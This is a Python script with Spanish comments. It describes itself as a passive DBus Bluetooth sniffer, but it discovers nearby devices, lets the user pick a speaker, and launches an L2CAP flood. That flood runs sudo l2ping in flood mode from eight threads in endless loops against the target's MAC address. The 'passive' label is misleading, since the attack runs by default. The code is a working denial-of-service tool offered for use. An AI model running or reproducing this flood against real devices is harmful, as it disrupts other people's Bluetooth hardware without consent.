#!/usr/bin/env python3
"""
blueflood_dbus.py - Sniffer pasivo usando DBus (mismo método que el panel gráfico)
No usa hcitool, solo DBus + btmon pasivo.
"""

import subprocess
import time
import sys
import os
import re

def show_banner():
    print("=" * 60)
    print("  BlueFlood DBus - Sniffer pasivo vía DBus (Panel Gráfico)")
    print("=" * 60)

def free_adapter():
    """Libera el adaptador de cualquier proceso que lo tenga ocupado"""
    print("[*] Liberando adaptador...")
    subprocess.run(['sudo', 'pkill', 'btmon'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['sudo', 'pkill', 'hcitool'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['sudo', 'pkill', 'bluetoothctl'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    subprocess.run(['sudo', 'hciconfig', 'hci0', 'down'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)
    subprocess.run(['sudo', 'hciconfig', 'hci0', 'up'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)
    print("[+] Adaptador liberado.\n")

def dbus_discover(duration=15):
    """
    Usa DBus (mismo método que el panel gráfico) para escanear.
    btmon se ejecuta como observador pasivo, sin abrir el dispositivo.
    """
    print(f"[*] Iniciando escaneo pasivo vía DBus ({duration}s)...")
    print("[*] Este es el mismo método que usa el panel gráfico.\n")
    
    # Iniciar btmon como observador (no bloquea el dispositivo)
    btmon_log = '/tmp/blueflood_btmon.log'
    btmon = subprocess.Popen(
        ['sudo', 'btmon', '-w', btmon_log],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    time.sleep(1)
    
    # Iniciar discovery vía DBus (lo mismo que hace el panel gráfico)
    print("[*] Comando: StartDiscovery vía DBus...")
    subprocess.run([
        'gdbus', 'call', '--system',
        '--dest', 'org.bluez',
        '--object-path', '/org/bluez/hci0',
        '--method', 'org.bluez.Adapter1.StartDiscovery'
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    print(f"[*] Escuchando tráfico pasivo durante {duration} segundos...")
    time.sleep(duration)
    
    # Detener discovery
    subprocess.run([
        'gdbus', 'call', '--system',
        '--dest', 'org.bluez',
        '--object-path', '/org/bluez/hci0',
        '--method', 'org.bluez.Adapter1.StopDiscovery'
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    time.sleep(2)
    btmon.terminate()
    btmon.wait()
    
    # Analizar resultados desde DBus
    print("[*] Recopilando dispositivos desde DBus...")
    result = subprocess.run([
        'gdbus', 'call', '--system',
        '--dest', 'org.bluez',
        '--object-path', '/',
        '--method', 'org.freedesktop.DBus.ObjectManager.GetManagedObjects'
    ], capture_output=True, text=True, timeout=5)
    
    devices = {}
    
    # Buscar direcciones MAC y nombres en la respuesta DBus
    mac_pattern = r"Address.*?'([0-9A-Fa-f:]{17})'"
    name_pattern = r"Name.*?'([^']*)'"
    alias_pattern = r"Alias.*?'([^']*)'"
    
    macs = re.findall(mac_pattern, result.stdout)
    names = re.findall(name_pattern, result.stdout)
    aliases = re.findall(alias_pattern, result.stdout)
    
    for mac in macs:
        mac_upper = mac.upper()
        if mac_upper not in devices:
            devices[mac_upper] = {'name': '(sin nombre)', 'method': 'DBus'}
    
    print(f"[+] DBus encontró {len(devices)} dispositivo(s).")
    
    # También buscar en el log de btmon
    if os.path.exists(btmon_log):
        with open(btmon_log, 'r', errors='ignore') as f:
            content = f.read()
            btmon_macs = re.findall(r'([0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2})', content)
            for mac in btmon_macs:
                mac_upper = mac.upper()
                if mac_upper not in devices:
                    devices[mac_upper] = {'name': '(detectado por btmon)', 'method': 'btmon'}
    
    return devices

def l2ping_flood(mac, packet_size=600):
    import threading
    cmd = ['sudo', 'l2ping', '-s', str(packet_size), '-f', mac]
    while True:
        try:
            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
        except:
            pass

def launch_attack(mac, threads=8, duration=60):
    import threading
    print(f"\n[!] INICIANDO ATAQUE L2CAP")
    print(f"    Objetivo: {mac}")
    print(f"    Hilos: {threads}")
    print(f"    Duración: {duration}s\n")
    
    for i in range(threads):
        t = threading.Thread(target=l2ping_flood, args=(mac,), daemon=True)
        t.start()
        print(f"    [+] Hilo {i+1} lanzado")
    
    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        print("\n[!] Detenido.")
    print("[*] Ataque finalizado.\n")

def main():
    import argparse
    parser = argparse.ArgumentParser(description='BlueFlood DBus - Sniffer pasivo')
    parser.add_argument('--mac', '-m', help='MAC del objetivo')
    parser.add_argument('--scan-only', action='store_true', help='Solo escanear')
    parser.add_argument('--duration', '-d', type=int, default=60)
    parser.add_argument('--threads', '-t', type=int, default=8)
    args = parser.parse_args()
    
    show_banner()
    
    if os.geteuid() != 0:
        print("[!] Necesitas sudo.")
        sys.exit(1)
    
    free_adapter()
    
    target_mac = args.mac.upper() if args.mac else None
    
    if not target_mac:
        devices = dbus_discover(duration=15)
        
        if not devices:
            print("\n[!] No se detectaron dispositivos.")
            print("[*] Consejos:")
            print("    - Activa modo pairing en el altavoz (pulsa botón BT)")
            print("    - Apaga el Bluetooth del móvil temporalmente")
            print("    - Acerca el altavoz al portátil\n")
            sys.exit(1)
        
        print("\nDispositivos detectados:")
        device_list = list(devices.items())
        for i, (mac, info) in enumerate(device_list):
            print(f"  {i+1}. {mac} - {info['name']} [{info['method']}]")
        
        if args.scan_only:
            sys.exit(0)
        
        choice = int(input("\nSelecciona el altavoz: ")) - 1
        target_mac = device_list[choice][0]
    
    # Verificar conectividad
    print(f"\n[*] Verificando {target_mac}...")
    try:
        result = subprocess.run(['sudo', 'l2ping', '-c', '3', target_mac],
                              timeout=10, capture_output=True, text=True)
        if 'received' in result.stdout:
            print("[+] Dispositivo responde.")
        else:
            print("[!] No responde a ping. Se intentará el ataque igualmente.")
    except:
        print("[!] No se pudo verificar.")
    
    launch_attack(target_mac, args.threads, args.duration)

if __name__ == '__main__':
    main()
